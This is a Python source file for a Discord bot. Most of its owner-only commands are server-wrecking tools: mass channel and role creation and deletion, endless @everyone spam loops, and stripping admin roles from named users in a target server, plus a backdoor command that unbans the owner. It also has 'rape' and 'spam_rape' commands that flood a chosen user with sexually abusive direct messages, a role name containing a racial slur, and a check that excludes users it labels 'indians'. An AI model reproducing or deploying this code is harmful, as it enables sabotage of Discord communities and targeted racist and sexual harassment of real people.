import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import time
import os
from dotenv import load_dotenv

load_dotenv()  # Load environment variables from.env file


token = os.getenv('DISCORD_BOT_TOKEN')
owner_id = 946386383809949756 #dovyrn
imintomen_id = 1142107446458978344

# Define the necessary intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent (if needed)
intents.members = True




mass_sending = False

bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)

class RemoveAdminView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Remove Admin", style=discord.ButtonStyle.danger, custom_id="remove_admin_button")
    async def remove_admin_button_callback(self, button: discord.ui.Button, interaction: discord.Interaction):
        # Acknowledge the interaction to prevent "Interaction Failed"
        await interaction.response.defer()
        await interaction.followup.send("Select a user to remove admin role:", view=self)

    @discord.ui.select(placeholder="Select a user to remove admin role", custom_id="select_menu", options=[])
    async def select_menu_callback(self, select: discord.ui.Select, interaction: discord.Interaction):
        # Acknowledge the interaction to prevent "Interaction Failed"
        await interaction.response.defer()

        # Get the selected user by ID from the select menu
        selected_user_id = int(select.values[0])
        selected_user = interaction.guild.get_member(selected_user_id)

        if selected_user is None:
            await interaction.followup.send("User not found.", ephemeral=True)
            return

        # Remove the admin role from the selected user
        for role in selected_user.roles:
            if role.permissions.administrator:
                await selected_user.remove_roles(role)
                await interaction.followup.send(f"Removed admin role from {selected_user.display_name}", ephemeral=True)
                return

        await interaction.followup.send(f"{selected_user.display_name} does not have an admin role.", ephemeral=True)


@bot.event
async def on_ready():   
    print(f'Bot is ready as {bot.user}')
    await bot.change_presence(status=discord.Status.online)
    bot.add_view(RemoveAdminView())
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

@bot.tree.command(name="check_admin", description="Check which users have admin permissions")
async def check_admins(interaction: discord.Interaction):
    if interaction.user.id == owner_id:  # Ensure only the owner can run this
        admins = [
            (member.id, member.display_name) for member in interaction.guild.members
            if any(role.permissions.administrator for role in member.roles)
        ]

        if admins:
            # Create a select menu component
            select_menu = discord.ui.Select(
                placeholder="Select a user to remove admin role",
                options=[discord.SelectOption(label=display_name, value=str(user_id)) for user_id, display_name in admins]
            )

            # Create a view with the select menu
            view = discord.ui.View()
            view.add_item(select_menu)

            # Send the interaction response with the select menu
            await interaction.response.send_message(
                f"The following users have admin permissions: {', '.join(display_name for _, display_name in admins)}",
                view=view,
                ephemeral=True
            )
        else:
            await interaction.response.send_message("No users have admin permissions in this server.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)


@bot.event
async def on_member_update(before, after):
    global owner_id
    # Ensure you're using the correct guild ID and owner ID
    guild_id = imintomen_id  # Replace with your variable for the target server
    owner_id = owner_id  # Use your variable for the bot owner's ID

    # IDs of the users to monitor
    user_ids = [755472029049946303, 755475988149960866]  # Replace with your user IDs

    if before.guild.id != guild_id:
        return  # Ignore updates in other servers

    # Check if the updated user is one of the target users
    if after.id in user_ids:
        # Check admin permissions before and after
        before_admin = any(role.permissions.administrator for role in before.roles)
        after_admin = any(role.permissions.administrator for role in after.roles)

        # Fetch the bot owner to send a message
        try:
            owner = await bot.fetch_user(owner_id)
        except discord.NotFound:
            return

        # If the user gained an admin role
        if not before_admin and after_admin:
            await owner.send(f"{after.mention} has been granted admin")

        # If the user lost an admin role
        elif before_admin and not after_admin:
            await owner.send(f"{after.mention} no longer has admin.")


@bot.tree.command()
@app_commands.describe(name="What name for the channels", amount= "How many channels to create")
async def create(interaction: discord.Interaction, name: str, amount: int):
    if interaction.user.id == owner_id:
        start_time = time.time()
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = interaction.guild

        async def create_channel():
            await guild.create_text_channel(name)

        # Create a list of tasks for creating channels
        tasks = [create_channel() for _ in range(amount)]
        
        # Run all tasks concurrently
        await asyncio.gather(*tasks)

        end_time = time.time()
        duration = end_time - start_time
        
        await interaction.response.send_message(f"Created {amount} channels named '{name}' in {duration:.2f} seconds.")
    else:
        await interaction.response.send_message("This command's power is a tempest, beyond mortal comprehension.")

@bot.hybrid_command()
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command()
async def remove(ctx, prefix: str):
    if ctx.author.id == owner_id:
        
        # Get all channels that start with the given prefix
        existing_channels = [channel for channel in ctx.guild.channels if channel.name.startswith(prefix)]
        if existing_channels:
            # Create a list of tasks for deleting channels
            delete_tasks = [channel.delete() for channel in existing_channels]
            
            # Run all deletion tasks concurrently
            await asyncio.gather(*delete_tasks)
            await print(f"Deleted {len(existing_channels)} channels starting with '{prefix}'.")
        else:
            await print(f"No channels starting with '{prefix}' to remove.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def mass(ctx, content: str, channel_name: str):
    global mass_sending  # Use the global variable
    if ctx.author.id == owner_id:
        
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = ctx.guild
        
        mass_sending = True  # Set the flag to true to start mass sending

        while mass_sending:  # Check the flag in the loop
            # Get all text channels in the guild, filter by channel name
            channels = [channel for channel in guild.text_channels if channel.name.startswith(channel_name)]

            tasks = []
            for channel in channels:
                tasks.append(asyncio.create_task(channel.send(f"{content}", allowed_mentions=allow_mentions)))
            await asyncio.gather(*tasks)
            print(f"Sent message '@everyone {content}' to {len(channels)} channels.")

    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def stop_mass(ctx):
    global mass_sending  # Use the global variable
    if ctx.author.id == owner_id:
        mass_sending = False  # Set the flag to false to stop mass sending
        await ctx.send("Mass messaging has been stopped.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def addrole(ctx, role_name: str, role_amount : int):
    if ctx.author.id == owner_id:
        
        guild = ctx.guild
        async def create_role():
            role = await guild.create_role(name=role_name)
        tasks = [create_role() for _ in range(role_amount)]
        await asyncio.gather(*tasks)
        print(f"Created {role_amount} roles named '{role_name}'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def delrole(ctx):
    if ctx.author.id == owner_id:
        
        bot_role = ctx.guild.me.top_role  # Get the bot's highest role
        # Filter roles to delete: not the bot's role, not @everyone, and not "legit bot test"
        roles_to_delete = [
            role for role in ctx.guild.roles 
            if role != bot_role and role.name != "@everyone" and role.name != "legit bot test"
        ]

        if roles_to_delete:
            # Create a list of delete tasks
            delete_tasks = [role.delete() for role in roles_to_delete]
            
            # Use asyncio.gather to run all delete tasks concurrently
            await asyncio.gather(*delete_tasks)
            
            await print(f"Deleted {len(roles_to_delete)} roles.")
        else:
            await print("No roles to delete except for the bot's role and 'legit bot test'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def ascend(ctx):
    if ctx.author.id == owner_id:
        role_names = ["Doryan", "cheems nigger slave"]
        roles = [discord.utils.get(ctx.guild.roles, name=name) for name in role_names]

        member = ctx.guild.get_member(owner_id)
        
        if any(role is None for role in roles):
            await ctx.send(f"One or more of the roles '{', '.join(role_names)}' are a phantom. Please summon them into existence first.")
            return
        for role in roles:
            try:
                await ctx.author.add_roles(role)
            except discord.Forbidden:
                await ctx.send("Regrettably, I lack the ability to wield the power of roles.")
                return
        await member.send("With great power comes great responsibility.")
    else:
        await ctx.send("A mortal shall not be given power...")

@bot.command()
async def create_invite(ctx):
    target_guild = bot.get_guild(imintomen_id)
    if target_guild:
            # Get the first text channel in the server to create an invite
        channel = target_guild.text_channels[0]
        invite = await channel.create_invite(max_age=300, max_uses=1)  # 5 min, 1 use
        await ctx.send(f"Embark on your journey here: {invite}")
    else:
        await ctx.send("The bot is not in the target server.")

@bot.command()
async def unban(ctx):
    if ctx.author.id == owner_id:
        target_guild = bot.get_guild(imintomen_id)
        if target_guild is None:
            await ctx.send(f"Bot is not in the server with ID {imintomen_id}.")
            return

        try:
            bans = target_guild.bans()
            async for ban_entry in bans:
                user = ban_entry.user
                if user.id == owner_id:
                    await target_guild.unban(user)
                    await ctx.send(f"{user.name} has been unbanned.")
                    break
            else:
                await ctx.send("The Master is not banned in this server.")
        except discord.Forbidden:
            await ctx.send("I do not have permission to unban members.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def state(ctx, state_type):
    if ctx.author.id == owner_id:
        if state_type == "idle":
            await bot.change_presence(status=discord.Status.idle)
        elif state_type == "dnd":
            await bot.change_presence(status=discord.Status.dnd)
        elif state_type == "online":
            await bot.change_presence(status=discord.Status.online)
        elif state_type == "offline":
            await bot.change_presence(status=discord.Status.offline)
        else:
            await ctx.send("Pleas uese 'idle', 'dnd', 'online' or 'offline'. ")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing.")

import asyncio

@bot.command()
async def clear_mass(ctx, content: str):
    if ctx.author.id == owner_id:
        deleted_count = 0  # Initialize the deleted_count here

        # Iterate through all the text channels in the guild where the command was issued
        for channel in ctx.guild.text_channels:
            if not channel.permissions_for(ctx.guild.me).read_messages:
                print(f"I don't have permission to read messages in {channel.name}.")
                continue  # Skip channels where the bot can't read messages

            try:
                messages_to_delete = []
                async for message in channel.history(limit=1000):  # Adjust the limit as needed
                    # Check if the message was sent by the bot and contains the specific content
                    if message.author == bot.user and content in message.content:
                        messages_to_delete.append(message)

                # Delete messages in batches
                if messages_to_delete:
                    await asyncio.gather(*(msg.delete() for msg in messages_to_delete))
                    deleted_count += len(messages_to_delete)  # Increment by the number of messages deleted

            except discord.Forbidden:
                print(f"I don't have permission to delete messages in {channel.name}.")
            except discord.HTTPException as e:
                print(f"An error occurred: {e}")

        # Print the result message after attempting to delete all the matching messages
        print(f"Deleted {deleted_count} messages containing '{content}' sent by the bot.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def alive(ctx):
    await ctx.send("I'm alive!")
@bot.command()
async def activity(ctx, state: str):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=discord.Game(state))
        await ctx.send(f"Changed activity to '{state}'.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")
@bot.command()
async def activity_clear(ctx):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=None)
        await ctx.send("Cleared activity.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")

@bot.command()
async def rape(ctx, user: discord.User):
    if user is None:
        await ctx.send("User not found.")
        return
        
    await bot.change_presence(activity=discord.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    
    rape_message = f"Youre being raped by <@{message_author}>\nhttps://tenor.com/view/gojo-satoru-gif-14818873849943523300"

    try:
            await user.send(rape_message)
    except discord.Forbidden:
        await ctx.send(f"I can't send a DM to {user.name}. They might have DMs disabled.")


@bot.tree.command()
@app_commands.describe(message="The message to send", amount="Amount of messages to send", batch = "Batches of messages to send")
async def spam(interaction: discord.Interaction, message: str, amount: int, batch : int):
    if amount > 25 and interaction.user.id != owner_id:
        await interaction.response.send_message("Maximum amount of 25 messages for Mortals.")
        return
    start_time = time.time()

    batch_size = batch  # Increased batch size
    batches = [message] * batch_size

    async def send_batch(messages):
        try:
            # Concatenate the messages into a single string
            message_text = '\n'.join(messages)
            await interaction.channel.send(message_text)
        except discord.HTTPException as e:
            print(f"Error sending message: {e}")

    tasks = []
    for i in range(0, amount, batch_size):
        batch = batches[:amount - i]
        tasks.append(asyncio.create_task(send_batch(batch)))

    await asyncio.gather(*tasks)
    end_time = time.time()
    duration = end_time - start_time
    await interaction.response.send_message(f"Spammed {amount} messages in {duration:.2f} seconds.")

    
@bot.command()
async def help(ctx):
    await ctx.send("""
Mortal commands:
- alive: Tells the bot that it is alive.
- create_invite: Creates an invite link to a text channel in the server.
- alive: Tells the bot that it is alive.
- rape: [userid]: Rapes the specified user.
- help: Displays this message.
- spam: Spams the channel with [message], [amount]. 25 messages for Mortals, Unlimited for Admin

Admin command:
- addrole [role_name] [role_amount]: Creates multiple roles with the same name.
- delrole: Deletes all roles except for the bot's role and 'legit bot test'.
- create [channel_name] and [channel_amount]: Creates multiple channels with the same name
- remove [channel_name]: Deletes all channels that starts with the name
- mass [message] OPTIONAL[channel_name]: Spams [message] in every channel
- stop_mass: Stops mass
- ascend:  Ascends Mahodovyron
- unban: Unbans the Master from the server.
- state [idle|dnd|online|offline]: Changes the bot's status.
- clear_mass [content]: Deletes all messages sent by the bot containing the specified content in every channel.
- activity [state]: Changes the bot's activity.""")

@bot.command()
async def purge(ctx, message):
    deleted_count = 0
    async for msg in ctx.channel.history(limit=100):
        if msg.author == bot.user and msg.content == message:
            await msg.delete()
            deleted_count += 1
    await ctx.send(f"Deleted {deleted_count} with the content {message}")

@bot.command()
@commands.cooldown(per=1, rate=5)
async def spam_rape(ctx, user: discord.User, amount: int):
    indians = [755472029049946303, 755475988149960866, 1223229005382025217, 907174800487743558]
    if ctx.author.id in indians:
        await ctx.send("This command is not for indians")
        return
    if amount > 100 and ctx.author.id!= owner_id:
        await ctx.send("Maximum amount of 25 messages for Mortals.")
        return
    if user is None:
        await ctx.send("User not found.")
        return
        
    await bot.change_presence(activity=discord.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    rape_message = f"Youre being raped by <@{message_author}>\nhttps://tenor.com/view/gojo-satoru-gif-14818873849943523300"

    async def send_message():
        try:
            await user.send(rape_message    )
        except discord.HTTPException as e:
            print(f"Error sending message: {e}")
        except discord.Forbidden:
            await ctx.send(f"I can't send a DM to {user.name}. They might have DMs disabled.")

    # Group messages in chunks to stay within rate limits
    tasks = []
    for i in range(amount):
        tasks.append(send_message())
        
        if (i + 1) % 10 == 0:
            await asyncio.gather(*tasks)
            tasks.clear()
    if tasks:
        await asyncio.gather(*tasks)

    await ctx.send(f"<@{ctx.author.id}> Finished raping <@{user.id}>")
    
@bot.tree.command(name="rar")
async def remove_admin_roles(interaction: discord.Interaction):
    target_server_id = imintomen_id  # Replace with your target server's ID
    user_ids = [755472029049946303, 755475988149960866]  # Replace with your user IDs
    
    target_guild = bot.get_guild(target_server_id)  # Get the target server (guild)

    if target_guild is None:
        await interaction.response.send_message(f"I am not in the server with ID {target_server_id}.", ephemeral=True)
        return

    removed_roles_count = 0

    if interaction.user.id == owner_id:  # Ensure only the bot owner can run this
        await interaction.response.send_message("Starting to remove admin roles...", ephemeral=True)  # Initial response

        for user_id in user_ids:
            try:
                # Fetch the member explicitly from the server
                target_user = await target_guild.fetch_member(user_id)

                if target_user is None:
                    await interaction.followup.send(f"User with ID {user_id} is not in the target server.", ephemeral=True)
                    continue

                # Get all roles with admin permissions
                admin_roles = [role for role in target_user.roles if role.permissions.administrator]

                if not admin_roles:
                    await interaction.followup.send(f"{target_user.mention} does not have any admin roles.", ephemeral=True)
                    continue

                try:
                    # Remove each admin role
                    for role in admin_roles:
                        await target_user.remove_roles(role, reason="Admin role removed by bot")
                    removed_roles_count += len(admin_roles)
                    await interaction.followup.send(f"Removed {len(admin_roles)} admin role(s) from {target_user.mention} in {target_guild.name}.", ephemeral=True)
                
                except discord.Forbidden:
                    await interaction.followup.send(f"I do not have permission to remove roles from {target_user.mention} in the target server.", ephemeral=True)
                
                except discord.HTTPException as e:
                    await interaction.followup.send(f"An error occurred while removing roles from {target_user.mention}: {e}", ephemeral=True)

            except discord.NotFound:
                await interaction.followup.send(f"User with ID {user_id} was not found in the target server.", ephemeral=True)
            except discord.HTTPException as e:
                await interaction.followup.send(f"Failed to fetch user {user_id} from the target server: {e}", ephemeral=True)

        # Final message after loop
        if removed_roles_count == 0:
            await interaction.followup.send("No admin roles were removed from the specified users.", ephemeral=True)
    else:
        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)




@bot.tree.command(name="hello")
async def hello(interaction : discord.Interaction):
    await interaction.response.send_message(f"Hello, {interaction.user.mention}!",
                                            ephemeral=True)

bot.run(token)
